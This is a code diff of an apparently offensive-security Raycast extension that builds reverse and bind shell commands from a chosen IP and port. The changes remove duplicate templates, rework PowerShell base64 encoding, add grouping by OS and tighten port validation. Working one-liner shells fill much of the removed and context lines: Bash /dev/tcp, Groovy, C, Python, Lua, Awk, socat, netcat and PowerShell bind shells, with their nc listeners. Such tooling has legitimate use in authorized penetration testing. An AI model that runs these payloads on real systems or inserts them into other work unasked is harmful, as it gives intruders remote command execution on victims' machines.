@@ -1,15 +1,4 @@
-import {
-  ActionPanel,
-  Action,
-  Form,
-  List,
-  Detail,
-  useNavigation,
-  showToast,
-  Toast,
-  Icon,
-  LocalStorage,
-} from "@raycast/api";
+import { ActionPanel, Action, Form, List, useNavigation, showToast, Toast, Icon, LocalStorage } from "@raycast/api";
 import { useState, useEffect } from "react";
 import { writeFile } from "fs/promises";
 import { homedir } from "os";
@@ -192,30 +181,6 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   },
 
   {
-    type: "bash-read-line",
-    name: "Bash Read Line",
-    icon: "🐚",
-    command: "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
-    description: "Bash read line reverse shell",
-    category: "reverse",
-    subcategory: "Shell Tools",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
-    type: "bash-5",
-    name: "Bash 5",
-    icon: "🐚",
-    command: "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
-    description: "Bash 5 reverse shell",
-    category: "reverse",
-    subcategory: "Shell Tools",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
     type: "nc-standard",
     name: "Netcat (Standard)",
     icon: "🔌",
@@ -298,70 +263,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     os: ["linux"],
     listener: "socat -d -d TCP-LISTEN:{PORT} STDOUT",
   },
-  {
-    type: "groovy",
-    name: "Groovy",
-    icon: "🎵",
-    command:
-      'groovy -e \'String host="{IP}";int port={PORT};Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();Socket s=new java.net.Socket(host,port);InputStream pi=p.getInputStream();OutputStream so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());so.flush();Thread.sleep(50);}p.destroy();s.close();\'',
-    description: "Groovy reverse shell",
-    category: "reverse",
-    subcategory: "Scripting Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
-    type: "c-linux",
-    name: "C",
-    icon: "©",
-    command:
-      'echo \'include<stdio.h>include<sys/socket.h>include<netinet/in.h>include<arpa/inet.h>int main(){int s=socket(2,1,0);struct sockaddr_in a;a.sin_family=2;a.sin_port=htons({PORT});a.sin_addr.s_addr=inet_addr("{IP}");connect(s,(void*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh",0);}\' > /tmp/s.c && gcc /tmp/s.c -o /tmp/s && /tmp/s',
-    description: "C reverse shell",
-    category: "reverse",
-    subcategory: "Compiled Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
 
-  {
-    type: "socat-tty",
-    name: "Socat (TTY)",
-    icon: "🔌",
-    command: "socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
-    description: "Socat reverse shell with TTY",
-    category: "reverse",
-    subcategory: "Shell Tools",
-    os: ["linux"],
-    listener: "socat -d -d TCP-LISTEN:{PORT} STDOUT",
-  },
-  {
-    type: "groovy",
-    name: "Groovy",
-    icon: "🎵",
-    command:
-      'groovy -e \'String host="{IP}";int port={PORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new java.net.Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\'',
-    description: "Groovy reverse shell",
-    category: "reverse",
-    subcategory: "Scripting Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
-    type: "c-linux",
-    name: "C",
-    icon: "©",
-    command:
-      'echo \'#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>int main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons({PORT});a.sin_addr.s_addr=inet_addr("{IP}");connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",NULL);return 0;}\' > /tmp/s.c && gcc /tmp/s.c -o /tmp/s && /tmp/s',
-    description: "C reverse shell",
-    category: "reverse",
-    subcategory: "Compiled Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
   {
     type: "haskell",
     name: "Haskell",
@@ -626,32 +528,6 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     command:
       'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
     description: "Python reverse shell variant",
-    category: "reverse",
-    subcategory: "Scripting Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
-    type: "lua",
-    name: "Lua",
-    icon: "🌙",
-    command:
-      "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
-    description: "Lua socket reverse shell",
-    category: "reverse",
-    subcategory: "Scripting Languages",
-    os: ["linux"],
-    listener: `nc -lvnp {PORT}
-# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
-  },
-  {
-    type: "awk",
-    name: "Awk",
-    icon: "🦅",
-    command:
-      'awk \'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'',
-    description: "Awk reverse shell",
     category: "reverse",
     subcategory: "Scripting Languages",
     os: ["linux"],
@@ -943,112 +819,6 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     listener: "while true; do printf '$ ' | nc -lvnp {PORT}; done",
   },
 
-  // ========== Bind Shells ==========
-  {
-    type: "bind-nc",
-    name: "Netcat Bind",
-    icon: "🔗",
-    command: "nc -lvp {PORT} -e /bin/sh",
-    description: "Netcat bind shell (Linux/Mac)",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["linux", "mac"],
-    listener: "nc -v {IP} {PORT}",
-  },
-  {
-    type: "bind-nc-windows",
-    name: "Netcat Bind (Windows)",
-    icon: "🔗",
-    command: "nc.exe -lvp {PORT} -e cmd.exe",
-    description: "Netcat bind shell (Windows)",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["windows"],
-    listener: "nc -v {IP} {PORT}",
-  },
-  {
-    type: "bind-socat",
-    name: "Socat Bind",
-    icon: "🔌",
-    command: "socat TCP-LISTEN:{PORT},fork EXEC:/bin/sh",
-    description: "Socat bind shell",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["linux", "mac"],
-    listener: "socat - TCP:{IP}:{PORT}",
-  },
-  {
-    type: "bind-python",
-    name: "Python Bind",
-    icon: "🐍",
-    command:
-      'python -c \'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
-    description: "Python bind shell",
-    category: "bind",
-    subcategory: "Scripting Languages",
-    os: ["linux", "mac"],
-    listener: "nc -v {IP} {PORT}",
-  },
-  {
-    type: "bind-powershell",
-    name: "PowerShell Bind",
-    icon: "⚡",
-    command:
-      'powershell -NoP -Exec Bypass -Command "$l=[System.Net.Sockets.TcpListener]({PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([byte[]]([Text.UTF8Encoding]::UTF8.GetBytes($r)),0,$r.Length)};$c.Close();$l.Stop()"',
-    description: "PowerShell bind shell",
-    category: "bind",
-    subcategory: "Windows",
-    os: ["windows"],
-    listener: "nc -v {IP} {PORT}",
-  },
-
-  // ========== Bind Shells ==========
-  {
-    type: "bind-nc",
-    name: "Netcat Bind",
-    icon: "🔗",
-    command: "nc -lvp {PORT} -e /bin/sh",
-    description: "Netcat bind shell (Linux/Mac)",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["linux", "mac"],
-    listener: "nc -v {IP} {PORT}",
-  },
-  {
-    type: "bind-nc-windows",
-    name: "Netcat Bind (Windows)",
-    icon: "🔗",
-    command: "nc.exe -lvp {PORT} -e cmd.exe",
-    description: "Netcat bind shell (Windows)",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["windows"],
-    listener: "nc -v {IP} {PORT}",
-  },
-  {
-    type: "bind-socat",
-    name: "Socat Bind",
-    icon: "🔌",
-    command: "socat TCP-LISTEN:{PORT},fork EXEC:/bin/sh",
-    description: "Socat bind shell",
-    category: "bind",
-    subcategory: "Shell Tools",
-    os: ["linux", "mac"],
-    listener: "socat - TCP:{IP}:{PORT}",
-  },
-  {
-    type: "bind-python",
-    name: "Python Bind",
-    icon: "🐍",
-    command:
-      'python -c \'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{PORT}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
-    description: "Python bind shell",
-    category: "bind",
-    subcategory: "Scripting Languages",
-    os: ["linux", "mac"],
-    listener: "nc -v {IP} {PORT}",
-  },
-
   // ========== MSFVenom Payloads ==========
   {
     type: "msfvenom-linux-x64",
@@ -1121,17 +891,23 @@ function generateAllCommands(ip: string, port: string): ShellTemplate[] {
   return SHELL_TEMPLATES.map((template) => {
     // Special handling for powershell-base64 template
     if (template.type === "powershell-base64") {
-      // Decode the base64 command
-      const decoded = Buffer.from(template.command, "base64").toString("utf-8");
-      // Replace IP and PORT placeholders
-      const replaced = decoded.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
-      // Re-encode to base64
-      const encoded = Buffer.from(replaced).toString("base64");
-      return {
-        ...template,
-        command: encoded,
-        listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
-      };
+      // Get the raw PowerShell command from powershell-1 template
+      const powershell1 = SHELL_TEMPLATES.find((t) => t.type === "powershell-1");
+      if (powershell1) {
+        // Replace IP and PORT in the raw command
+        const replaced = powershell1.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
+        // Extract just the PowerShell command part after -Command
+        const cmdMatch = replaced.match(/-Command\s+(.+)/);
+        if (cmdMatch) {
+          // Encode the command part to UTF-16LE and then base64
+          const encoded = Buffer.from(cmdMatch[1], "utf16le").toString("base64");
+          return {
+            ...template,
+            command: `powershell -e ${encoded}`,
+            listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
+          };
+        }
+      }
     }
 
     // Standard handling for all other templates
@@ -1172,8 +948,9 @@ function isValidIP(ip: string): boolean {
 
 // Validate port number
 function isValidPort(port: string): boolean {
-  const portNum = parseInt(port);
-  return !isNaN(portNum) && portNum >= 1 && portNum <= 65535;
+  if (!/^\d+$/.test(port)) return false;
+  const portNum = Number(port);
+  return Number.isInteger(portNum) && portNum >= 1 && portNum <= 65535;
 }
 
 // URL encoding
@@ -1196,6 +973,31 @@ function groupBySubcategory(commands: ShellTemplate[]): Record<string, ShellTemp
     groups[cmd.subcategory].push(cmd);
   });
   return groups;
+}
+
+// Group by OS
+function groupByOS(commands: ShellTemplate[]): Record<string, ShellTemplate[]> {
+  const groups: Record<string, ShellTemplate[]> = {};
+  commands.forEach((cmd) => {
+    const osKey = cmd.os[0];
+    if (!groups[osKey]) {
+      groups[osKey] = [];
+    }
+    groups[osKey].push(cmd);
+  });
+  const sortedGroups: Record<string, ShellTemplate[]> = {};
+  const osOrder = ["linux", "mac", "windows"];
+  osOrder.forEach((os) => {
+    if (groups[os]) {
+      sortedGroups[os] = groups[os];
+    }
+  });
+  Object.keys(groups).forEach((os) => {
+    if (!sortedGroups[os]) {
+      sortedGroups[os] = groups[os];
+    }
+  });
+  return sortedGroups;
 }
 
 // Get OS tag color
@@ -1267,7 +1069,7 @@ function ShowAllCommands({ ip, port }: FormValues) {
     }
   });
 
-  const groupedCommands = groupBySubcategory(sortedCommands);
+  const groupedCommands = sortBy === "os" ? groupByOS(sortedCommands) : groupBySubcategory(sortedCommands);
 
   return (
     <List
@@ -1283,19 +1085,24 @@ function ShowAllCommands({ ip, port }: FormValues) {
         </List.Dropdown>
       }
     >
-      {Object.entries(groupedCommands).map(([subcategory, cmds]) => (
-        <List.Section key={subcategory} title={subcategory}>
-          {cmds.map((cmd) => (
-            <List.Item
-              key={cmd.type}
-              icon={cmd.icon}
-              title={cmd.name}
-              accessories={cmd.os.map((os) => ({
-                tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
-              }))}
-              detail={
-                <List.Item.Detail
-                  markdown={`
+      {Object.entries(groupedCommands).map(([groupKey, cmds]) => {
+        const sectionTitle =
+          sortBy === "os"
+            ? { linux: "🐧 Linux", mac: "🍎 macOS", windows: "🪟 Windows" }[groupKey] || groupKey
+            : groupKey;
+        return (
+          <List.Section key={groupKey} title={sectionTitle}>
+            {cmds.map((cmd) => (
+              <List.Item
+                key={cmd.type}
+                icon={cmd.icon}
+                title={cmd.name}
+                accessories={cmd.os.map((os) => ({
+                  tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
+                }))}
+                detail={
+                  <List.Item.Detail
+                    markdown={`
 # ${cmd.icon} ${cmd.name}
 
 ## Description
@@ -1317,122 +1124,123 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
 ---
 
 > ⚠️ **Security Warning**
-> 
+>
 > This command should only be used in authorized security testing environments.
 > Unauthorized use of reverse shells may violate laws and regulations.
 `}
-                />
-              }
-              actions={
-                <ActionPanel>
-                  <Action.CopyToClipboard
-                    title="Copy Command"
-                    content={cmd.command}
-                    shortcut={{ modifiers: ["cmd"], key: "c" }}
-                    onCopy={() => {
-                      showToast({
-                        style: Toast.Style.Success,
-                        title: "Copied to Clipboard",
-                        message: cmd.name,
-                      });
-                    }}
                   />
-                  <Action.CopyToClipboard
-                    title="Copy URL Encoded"
-                    content={urlEncode(cmd.command)}
-                    shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
-                    onCopy={() => {
-                      showToast({
-                        style: Toast.Style.Success,
-                        title: "Copied URL Encoded Command",
-                        message: cmd.name,
-                      });
-                    }}
-                  />
-                  <Action.CopyToClipboard
-                    title="Copy Base64 Encoded"
-                    content={base64Encode(cmd.command)}
-                    shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
-                    onCopy={() => {
-                      showToast({
-                        style: Toast.Style.Success,
-                        title: "Copied Base64 Encoded Command",
-                        message: cmd.name,
-                      });
-                    }}
-                  />
-                  {cmd.listener && (
+                }
+                actions={
+                  <ActionPanel>
                     <Action.CopyToClipboard
-                      title="Copy Listener Command"
-                      content={cmd.listener}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
+                      title="Copy Command"
+                      content={cmd.command}
+                      shortcut={{ modifiers: ["cmd"], key: "c" }}
                       onCopy={() => {
                         showToast({
                           style: Toast.Style.Success,
-                          title: "Copied Listener Command",
+                          title: "Copied to Clipboard",
                           message: cmd.name,
                         });
                       }}
                     />
-                  )}
-                  <Action
-                    title="Save to File"
-                    icon={Icon.Download}
-                    shortcut={{ modifiers: ["cmd"], key: "s" }}
-                    onAction={async () => {
-                      try {
-                        const filePath = join(
-                          homedir(),
-                          "Downloads",
-                          `${cmd.type}_${Date.now()}${getFileExtension(cmd.type)}`,
-                        );
-                        await writeFile(filePath, cmd.command);
+                    <Action.CopyToClipboard
+                      title="Copy URL Encoded"
+                      content={urlEncode(cmd.command)}
+                      shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
+                      onCopy={() => {
                         showToast({
                           style: Toast.Style.Success,
-                          title: "Saved to File",
-                          message: filePath,
+                          title: "Copied URL Encoded Command",
+                          message: cmd.name,
                         });
-                      } catch (error) {
+                      }}
+                    />
+                    <Action.CopyToClipboard
+                      title="Copy Base64 Encoded"
+                      content={base64Encode(cmd.command)}
+                      shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
+                      onCopy={() => {
                         showToast({
-                          style: Toast.Style.Failure,
-                          title: "Save Failed",
-                          message: error instanceof Error ? error.message : "Unknown error",
+                          style: Toast.Style.Success,
+                          title: "Copied Base64 Encoded Command",
+                          message: cmd.name,
                         });
-                      }
-                    }}
-                  />
-                  <ActionPanel.Section title="Sort">
-                    <Action
-                      title="Sort by Category"
-                      icon={Icon.AppWindowList}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
-                      onAction={() => setSortBy("category")}
+                      }}
                     />
+                    {cmd.listener && (
+                      <Action.CopyToClipboard
+                        title="Copy Listener Command"
+                        content={cmd.listener}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
+                        onCopy={() => {
+                          showToast({
+                            style: Toast.Style.Success,
+                            title: "Copied Listener Command",
+                            message: cmd.name,
+                          });
+                        }}
+                      />
+                    )}
                     <Action
-                      title="Sort by Name"
-                      icon={Icon.Text}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
-                      onAction={() => setSortBy("name")}
+                      title="Save to File"
+                      icon={Icon.Download}
+                      shortcut={{ modifiers: ["cmd"], key: "s" }}
+                      onAction={async () => {
+                        try {
+                          const filePath = join(
+                            homedir(),
+                            "Downloads",
+                            `${cmd.type}_${Date.now()}${getFileExtension(cmd.type)}`,
+                          );
+                          await writeFile(filePath, cmd.command);
+                          showToast({
+                            style: Toast.Style.Success,
+                            title: "Saved to File",
+                            message: filePath,
+                          });
+                        } catch (error) {
+                          showToast({
+                            style: Toast.Style.Failure,
+                            title: "Save Failed",
+                            message: error instanceof Error ? error.message : "Unknown error",
+                          });
+                        }
+                      }}
                     />
+                    <ActionPanel.Section title="Sort">
+                      <Action
+                        title="Sort by Category"
+                        icon={Icon.AppWindowList}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
+                        onAction={() => setSortBy("category")}
+                      />
+                      <Action
+                        title="Sort by Name"
+                        icon={Icon.Text}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
+                        onAction={() => setSortBy("name")}
+                      />
+                      <Action
+                        title="Sort by Os"
+                        icon={Icon.ComputerChip}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
+                        onAction={() => setSortBy("os")}
+                      />
+                    </ActionPanel.Section>
                     <Action
-                      title="Sort by Os"
-                      icon={Icon.ComputerChip}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
-                      onAction={() => setSortBy("os")}
+                      title="Re-enter Ip/port"
+                      icon={Icon.ArrowClockwise}
+                      shortcut={{ modifiers: ["cmd"], key: "r" }}
+                      onAction={pop}
                     />
-                  </ActionPanel.Section>
-                  <Action
-                    title="Re-enter Ip/port"
-                    icon={Icon.ArrowClockwise}
-                    shortcut={{ modifiers: ["cmd"], key: "r" }}
-                    onAction={pop}
-                  />
-                </ActionPanel>
-              }
-            />
-          ))}
-        </List.Section>
-      ))}
+                  </ActionPanel>
+                }
+              />
+            ))}
+          </List.Section>
+        );
+      })}
     </List>
   );
 }
@@ -1441,18 +1249,20 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
 export default function Command() {
   const [ipError, setIpError] = useState<string | undefined>();
   const [portError, setPortError] = useState<string | undefined>();
-  const [ip, setIp] = useState<string>("");
-  const [port, setPort] = useState<string>("");
-  const [isLoading, setIsLoading] = useState(true);
+  const [ip, setIp] = useState<string>("10.10.10.10");
+  const [port, setPort] = useState<string>("9001");
   const { push } = useNavigation();
 
-  // Load configuration
+  // Load configuration in background
   useEffect(() => {
-    loadConfig().then((config) => {
-      setIp(config.ip);
-      setPort(config.port);
-      setIsLoading(false);
-    });
+    loadConfig()
+      .then((config) => {
+        setIp(config.ip);
+        setPort(config.port);
+      })
+      .catch(() => {
+        // Keep default values
+      });
   }, []);
 
   async function handleSubmit(values: FormValues) {
@@ -1486,10 +1296,6 @@ export default function Command() {
     }
   }
 
-  if (isLoading) {
-    return <Detail isLoading={true} />;
-  }
-
   return (
     <Form
       actions={
@@ -1508,7 +1314,7 @@ export default function Command() {
         id="ip"
         title="Target IP Address"
         placeholder="192.168.1.100"
-        value={ip}
+        value={ip || "10.10.10.10"}
         error={ipError}
         onChange={(value) => {
           setIp(value);
@@ -1519,7 +1325,7 @@ export default function Command() {
         id="port"
         title="Listener Port"
         placeholder="9001"
-        value={port}
+        value={port || "9001"}
         error={portError}
         onChange={(value) => {
           setPort(value);
